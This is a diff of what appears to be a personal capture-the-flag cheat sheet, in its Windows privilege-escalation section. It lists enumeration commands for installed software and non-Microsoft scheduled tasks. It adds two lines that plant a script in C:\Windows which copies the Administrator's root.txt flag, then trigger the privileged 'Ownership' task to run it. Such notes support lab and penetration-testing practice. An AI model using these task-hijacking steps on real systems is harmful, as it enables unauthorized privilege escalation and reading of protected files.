@@ -675,9 +675,11 @@ reset
 
 ## Windows
 [*] Privilege Escalation
+powershell -c "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher"
 Get-ScheduledTask | Where-Object {($_.Author -notmatch "Microsoft") -and ($_.TaskPath -notmatch "Microsoft")} | Select-Object TaskName, TaskPath, State, Author
 $task = Get-ScheduledTask -TaskName "Ownership"; $task.Actions; $task.Triggers; $task.Settings; $task | Format-List *
-powershell -c "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher"
+echo 'type C:\Users\Administrator\Desktop\root.txt > C:\Windows\win.log' > C:\Windows\SYSTEM.ps1
+Start-ScheduledTask -TaskName "Ownership"
 
 dir C:\inetpub\wwwroot
 dir C:\xampp
